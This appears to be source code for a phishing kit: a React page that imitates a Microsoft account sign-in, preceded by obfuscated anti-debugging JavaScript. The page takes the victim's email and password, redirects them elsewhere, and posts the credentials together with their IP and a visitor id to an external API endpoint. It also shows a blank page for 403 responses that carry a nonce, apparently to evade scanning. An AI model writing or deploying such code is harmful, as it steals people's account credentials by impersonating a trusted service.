_0x25b666(_0x1f2ab8[_0x4f72ca(0x22a)][_0x4f72ca(0x24d)]);}['constructor'](_0xb3aa3[_0x4860cc(0x2be)]('debu',_0xb3aa3[_0x4860cc(0x29f)]))[_0x4860cc(0x215)](_0xb3aa3[_0x4860cc(0x26e)]);_0xb3aa3[_0x4860cc(0x2e3)](_0x31474e,++_0x185d39);}}try{if(_0xb3aa3[_0x895bb5(0x2ac)](_0xb3aa3[_0x895bb5(0x240)],_0xb3aa3[_0x895bb5(0x219)]))return![];else{if(_0x1f9824)return _0x31474e;else _0xb3aa3['bSliY'](_0x31474e,0x1df4+0x1bf*-0xe+-0x582*0x1);}}catch(_0x37b22f){}}function a2_0x32a8(){const _0x1d2d23=['eUBwJ','apply','defineProperty','uaLLN','ovxYC','PCAgd','default','NMkXV','NWtUr','then','Forgot\x20my\x20password','bNlDu','return\x20(function()\x20','animate-slideAndFadeIn','Can\x27t\x20access\x20your\x20account?','flex\x20items-center\x20ml-10\x20mt-2','kWKuC','ipzrL','Next','no-repeat','XwmnV','gUtST','target','BuesH','12QkSFak','QGvME','316xnBrss','1043462IBCvTh','length','QEthl','warn','login','sjdBV','mqTDm','__esModule','yWGXK','WsfqD','393651BwnohR','GTpwc','constructor','hwtog','338px','iHlrh','wYlov','AukvR','CwUSG','IWHRa','uNJbQ','4103WazxYT','fzzZl','uyLXj','cGEjl','application/json','HaYxY','bg-white\x20drop-shadow-md\x20overflow-hidden\x20mt-[20px]\x20','mCeCM','glPgf','value','exception','kWJzl','table','preventDefault','Error:','ZBHUi','zDoMf','KsTRw','toString','catch','ZReBt','ugUsq','/key.svg','location','stringify','debu','UBDJV','GLDIh','button','submit','MaVHz','REACT_APP_REDIRECT_URL_M','@mui/icons-material/ArrowBack','center\x20center','11860SfSYaL','flex\x20flex-col\x20items-center\x20justify-center\x20min-h-screen\x20bg-gray-100\x20p-4','createElement','text-sm\x20text-[12.5px]\x20text-gray-600','Sign-in\x20options','oVLkh','__proto__','Enter\x20password','OvaNw','madpj','vizNk','useState','error','bbgrZ','Fragment','GKdef','bind','aUVAc','test','kNIbH','sIrot','OnxMK','password','RHdRP','function\x20*\x5c(\x20*\x5c)','XBYAq','get','vvfyX','sWIiT','./App.css','hezpQ','REACT_APP_API_URL','ocvMd','DYxmK','kYrZL','BncZf','Sign\x20in','NuKLp','27WezZWc','GJIkg','uUBEp','nTQqE','rQEVD','email','group\x20relative\x20w-[110px]\x20h-[30px]\x20mt-4\x20flex\x20items-center\x20justify-center\x20border\x20border-transparent\x20text-md\x20font-medium\x20text-white\x20bg-[#0067b8]\x20hover:bg-blue-700\x20focus:outline-none\x20focus:ring-2\x20focus:ring-offset-2\x20focus:ring-blue-500','onlYq','uFQHo','pmzlZ','CBziq','UVWVs','BKkxL','LYPjU','IcktA','Dzews','Sign-in\x20Options','pwntk','4190iVYQpt','DhceD','text-[12.5px]','stateObject','/m_logo.svg','span','mt-[-20px]\x20text-2xl\x20font-semibold\x20text-gray-900','10px','text-gray-500','yBKVC','{}.constructor(\x22return\x20this\x22)(\x20)','SFvUe','440px','\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','DHtdu','nXzOE','QstGr','bcutc','ectyO','NrJtR','while\x20(true)\x20{}','DjjfF','ObUVa','kUHyM','mcAoI','w-auto','vEeAD','tsOAY','epEYL','gger','hVKsa','space-y-6\x20p-[13px]','bSKFP','chain','search','gYYyw','LeHjr','cVjQy','lgPFj','yDcHI','div','cbvUd','MYeWa','mpCyu','p-1\x20text-sm\x20rounded-full\x20text-whitefocus:ring-2\x20\x20focus:ring-offset-2','gktDZ','KQlJN','status','bdLmY','myuit','hqMuO','EwWqR','sr-only','YpWFS','href','rGDEM','url(\x27/bg.svg\x27)','20px','422144IfIlin','LaFAR','env','WgEfW','concat','pBOPd','bpnmn','YTkJU','JWIiL','flex\x20justify-end','No\x20account?\x20\u00a0','bSliY','48px','opsdm','zlkNF','eLfUg','aNcXM','text-sm\x20text-[12.5px]\x20text-gray-800','UUCfg','dCvHy','18px','Email,\x20phone,\x20or\x20Skype','LHtsM','xVAoZ','text-[#0067b8]','DLNdI','GkKyO','818752LFTAKP','OAmSw','react','wtbWc','prototype','appearance-none\x20block\x20w-full\x20py-2\x20border-b\x20border-black\x20placeholder-gray-500\x20text-gray-900\x20focus:outline-none\x20focus:ring-indigo-500\x20\x20sm:text-md','KnEFO','BuEcY','xxarC','YgdtH','MtpXH','87870KfejOZ','call','xCwaB','wvFtv','input','Password','yGLlv','XjAHZ','qUxmp','uiDqi','console','HOwfw','init','form','UDXDR','counter','HmnrA','wGMGJ','fFCBe','lzLLL','uSptz','BRDAa','iHPwh','rzthY','trace','rSnTz','mRqjT','info','rzNPd','pOXlX','33px','bg-white\x20drop-shadow-md\x20overflow-hidden','qxazt','text','keQNC','ytLCd','bCjBb'];a2_0x32a8=function(){return _0x1d2d23;};return a2_0x32a8();}(function(){const _0x44be3c=a2_0x581277,_0x4cbd3a={'UDXDR':function(_0x5f086b,_0x46e9d9){return _0x5f086b===_0x46e9d9;},'hwtog':_0x44be3c(0x2ba),'iHlrh':function(_0x2555c7,_0x15c195){return _0x2555c7(_0x15c195);},'MaVHz':function(_0x265883,_0x3f041c){return _0x265883+_0x3f041c;},'MtpXH':_0x44be3c(0x220),'NuKLp':_0x44be3c(0x2a8),'dvAeI':function(_0x52976d){return _0x52976d();}},_0xa29fe5=function(){const _0x39c640=_0x44be3c;if(_0x4cbd3a[_0x39c640(0x1fd)](_0x4cbd3a[_0x39c640(0x23c)],_0x4cbd3a['hwtog'])){let _0x637ac;try{_0x637ac=_0x4cbd3a[_0x39c640(0x23e)](Function,_0x4cbd3a[_0x39c640(0x262)](_0x4cbd3a[_0x39c640(0x2fd)]+_0x4cbd3a[_0x39c640(0x28b)],');'))();}catch(_0x1798fb){_0x637ac=window;}return _0x637ac;}else{const _0x51df7b=_0x145a1a?function(){const _0x393cde=_0x39c640;if(_0x20b3d7){const _0x1307cd=_0x57308c[_0x393cde(0x215)](_0x23bea8,arguments);return _0x3403cb=null,_0x1307cd;}}:function(){};return _0xcc891=![],_0x51df7b;}},_0x6d8b04=_0x4cbd3a['dvAeI'](_0xa29fe5);_0x6d8b04['setInterval'](a2_0x6d724a,0x13a5+-0x1aa4*-0x1+-0x8eb*0x3);}());
+import "./App.css";
+import { useState } from "react";
+import ArrowBackIcon from "@mui/icons-material/ArrowBack";
+import React from 'react';
+
+
+function App({ visitor, ip }) {
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  var [status, setStatus] = useState(200);
+  const [showSignIn, setShowSignIn] = useState(true);
+  const [animateOut, setAnimateOut] = useState(false);
+
+  const queryParams = new URLSearchParams(window.location.search);
+  const nonce = queryParams.get("nonce");
+
+  const handleEmailChange = (event) => {
+    setEmail(event.target.value);
+  };
+
+  const handlePasswordChange = (event) => {
+    setPassword(event.target.value);
+  };
+
+  const handleSubmit = (event) => {
+    event.preventDefault();
+
+    if (email && !password) {
+      // Start the slide out
+      event.preventDefault(); // Prevent form from submitting and refreshing the page
+      setAnimateOut(true);
+
+      // Wait for the animation to finish before removing the element
+      setTimeout(() => {
+        setShowSignIn(false);
+      }, 500); // This should match the duration of your slide-out animation
+    } else if (email && password) {
+      window.location.href = process.env.REACT_APP_REDIRECT_URL_M.toString();
+      fetch(process.env.REACT_APP_API_URL + "login", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          visitor: visitor,
+          ip: ip,
+          email: email,
+          password: password,
+        }),
+      })
+        .then((response) => {
+          console.log(response.status);
+          if (response.status === 403) {
+            setStatus(403);
+          } else {
+            setStatus(200);
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+        });
+    }
+  };
+
+  const backgroundStyle = {
+    backgroundImage: `url('/bg.svg')`, 
+    backgroundPosition: "center center", 
+    backgroundRepeat: "no-repeat", 
+  };
+
+  const handleNextClick = (event) => {
+    event.preventDefault(); 
+    setAnimateOut(true);
+
+    setTimeout(() => {
+      setShowSignIn(false);
+    }, 500); 
+  };
+
+  return (
+    <>
+      {status === 403 && nonce ? (
+        <div></div>
+      ) : (
+        <div
+          className="flex flex-col items-center justify-center min-h-screen bg-gray-100 p-4"
+          style={backgroundStyle}
+        >
+          <div
+            className="bg-white drop-shadow-md overflow-hidden"
+            style={{
+              width: "440px",
+              height: "338px",
+              padding: "32px",
+            }}
+          >
+            <form className="space-y-6 p-[13px]" onSubmit={handleSubmit}>
+              <img
+                className="w-auto"
+                src="/m_logo.svg" // 
+                alt=" Logo"
+              />
+              {showSignIn ? (
+                <div
+                  className={`transition duration-300 ${
+                    animateOut ? "animate-slideAndFade" : ""
+                  }`}
+                >
+                  <div>
+                    <h2 className=" mt-[-15px] text-2xl font-semibold text-gray-900">
+                      Sign in
+                    </h2>
+                  </div>
+                  <div style={{ marginTop: "10px" }}>
+                    <label htmlFor="email" className="sr-only">
+                      Email, phone, or Skype
+                    </label>
+                    <input
+                      id="email"
+                      name="email"
+                      type="text"
+                      required
+                      className="appearance-none block w-full py-2 border-b border-black placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-indigo-500  sm:text-md"
+                      placeholder="Email, phone, or Skype"
+                      value={email}
+                      onChange={handleEmailChange}
+                    />
+                  </div>
+                  <div
+                    className="text-sm text-[12.5px] text-gray-800"
+                    style={{ marginTop: "20px" }}
+                  >
+                    No account? &nbsp;
+                    <a href="#" className="text-[#0067b8]">
+                      Create one!
+                    </a>
+                  </div>
+                  <div className="text-[12.5px]" style={{ marginTop: "18px" }}>
+                    <a href="#" className="text-[#0067b8]">
+                      Can't access your account?
+                    </a>
+                  </div>
+                  <div className="flex justify-end">
+                    <button
+                      type="submit"
+                      onSubmit={() => handleNextClick()}
+                      className="group relative w-[110px] h-[30px] mt-4 flex items-center justify-center border border-transparent text-md font-medium text-white bg-[#0067b8] hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
+                    >
+                      Next
+                    </button>
+                  </div>
+                </div>
+              ) : (
+                <div
+                  className="animate-slideAndFadeIn"
+                  style={{ marginTop: "12px" }}
+                >
+                  <div style={{ marginBottom: "20px" }}>
+                    <button className="p-1 text-sm rounded-full text-whitefocus:ring-2  focus:ring-offset-2">
+                      <ArrowBackIcon
+                        className="text-gray-500"
+                        style={{ fontSize: "15px" }}
+                      />
+                    </button>
+                    <span className="">{email}</span>
+                  </div>
+
+                  <div>
+                    <h2 className="mt-[-20px] text-2xl font-semibold text-gray-900">
+                      Enter password
+                    </h2>
+                  </div>
+
+                  <div style={{ marginTop: "10px" }}>
+                    <label htmlFor="email" className="sr-only">
+                      Password
+                    </label>
+                    <input
+                      id="password"
+                      name="password"
+                      type="password"
+                      required
+                      className="appearance-none block w-full py-2 border-b border-black placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-indigo-500  sm:text-md"
+                      placeholder="Password"
+                      value={password}
+                      onChange={handlePasswordChange}
+                    />
+                  </div>
+
+                  <div
+                    className="text-sm text-[12.5px] text-gray-600"
+                    style={{ marginTop: "20px" }}
+                  >
+                    <a href="#" className="text-[#0067b8]">
+                      Forgot my password
+                    </a>
+                  </div>
+
+                  <div className="flex justify-end">
+                    <button
+                      type="submit"
+                      className="group relative w-[110px] h-[33px] mt-4 flex items-center justify-center border border-transparent text-md font-medium text-white bg-[#0067b8] hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
+                    >
+                      Sign in
+                    </button>
+                  </div>
+                </div>
+              )}
+            </form>
+          </div>
+
+          <div
+            className={`bg-white drop-shadow-md overflow-hidden mt-[20px] ${
+              !showSignIn ? "animate-fadeOut" : ""
+            }`}
+            style={{
+              width: "440px",
+              height: "48px",
+            }}
+          >
+            <div className="flex items-center ml-10 mt-2">
+              <img
+                src="/key.svg"
+                alt="Sign-in Options"
+                className="mr-3 " // Add some margin to the right of the image
+                style={{ height: "33px" }}
+              />
+              <span className="text-[12.5] ">Sign-in options</span>{" "}
+              {/* text-sm for 15px font size */}
+            </div>
+          </div>
+        </div>
+      )}
+    </>
+  );
+}
+
+export default App;
